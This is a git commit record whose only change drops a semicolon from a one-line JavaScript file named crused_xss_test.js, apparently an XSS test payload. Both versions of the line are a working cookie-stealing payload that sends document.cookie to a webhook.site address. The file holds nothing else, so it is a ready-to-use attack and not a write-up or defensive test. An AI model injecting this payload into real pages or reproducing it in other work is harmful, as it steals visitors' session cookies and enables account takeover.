aff3e0a7061d7939934bee4f6ecc3a4235b91b5b
anhvantt <147018904+anhvantt@users.noreply.github.com>
2023-10-05 11:25:15 +0700

    Update crused_xss_test.js

--- crused_xss_test.js
+++ crused_xss_test.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/d7738f17-6635-442f-9b96-a0c652ae92c5/?cookie="+document.cookie);
+fetch("https://webhook.site/d7738f17-6635-442f-9b96-a0c652ae92c5/?cookie="+document.cookie)
